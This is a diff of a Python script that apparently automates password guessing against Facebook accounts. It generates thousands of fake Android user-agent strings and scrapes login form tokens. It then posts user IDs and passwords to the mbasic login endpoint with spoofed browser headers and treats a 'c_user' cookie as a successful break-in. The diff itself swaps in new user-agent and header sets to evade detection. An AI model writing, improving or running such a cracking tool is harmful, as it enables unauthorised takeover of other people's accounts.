@@ -104,31 +104,21 @@ cv.add("[bold red]Choice Option")
 
 
 ugen=[]
-for ua in range(12000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12','13','14','15'])
-	y=random.choice(['RMX3572','RMX3395','RMX3396','RMX2117','RMX3161','RMX3121','RMX3125','RMX3041','RMX2200','RMX2111','RMX2111','RMX3560'])
-	c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,168)
-	h='Mobile Safari/537.36'
-	rocky=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(rocky)
-	
-for ua in range(10000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['6','7','8','9','10','11','12','13'])
-	c=random.choice(['SM-M546B','SM-N981B','SSM-N981N','SM-N981W','SM-N985F','SM-N900','SM-N9002','LM-Q710(FGN)'])
-	d=') Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(92,115)
-	x='0'
-	f=random.randrange(4200,6000)
-	g=random.randrange(62,199)
-	h='Mobile Safari/537.36'
-	lol=f'{a} {b}; {c}{d}{e}.{x}.{f}.{g} {h}'
-	ugen.append(lol)
+for x in range(5000):
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
 
 ua = [
 "Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.69 Mobile Safari/537.36 BingSapphire/24.1.410218302",
@@ -315,7 +305,27 @@ def need(uid,pwx,fb,tl):
             uuu=random.choice(ugen)
             free_fb = session.get(f'https://{fb}.facebook.com').text
             info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
-            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            update= {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://mbasic.facebook.com/?paipv=0&eav=AfYNQbsn0CaDnpqYVc27BvWEb-Pc8Muikg4pkbRDgWq7Uq42nPy4iNlQpzUrMbhoCMA&wtsid=rdr_09iJ7Y1M6Hpsut6gQ&subno_key=AaEA59Wd_fewW8ukd8dcbNCf4pSRCvh5sZZ5ACAXifswfOBBJG8FFDPO3qhdsi5ShTJ8wPHRcNH11Uue87QzYV_gkCXjyO70exhfy85Cnki0HcR9Lh5Qbhf_iM2_gyDU4UGS9-snBQztBpfXZkqctaKMNLFifXnPl6GR6L7MPa2fMQimS3WMhP0wOn1ncVCHVWXJVLJMKomMBcOJ0rLCwb03QlahQwLW4GW-wDjGyneQL9uzossNZJN9QRcyO2YbRF2JnUEz7vX9fMq-7s4ROC8dXlhyZSVgihXSb17DAoxMaR1oAOZls4PJA3bsOQbZEJ8&hrc=1&refsrc=deprecated&_rdr',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO KE7"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': uuu,
+    'viewport-width': '980',
+}
             session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
             heron_brand=session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
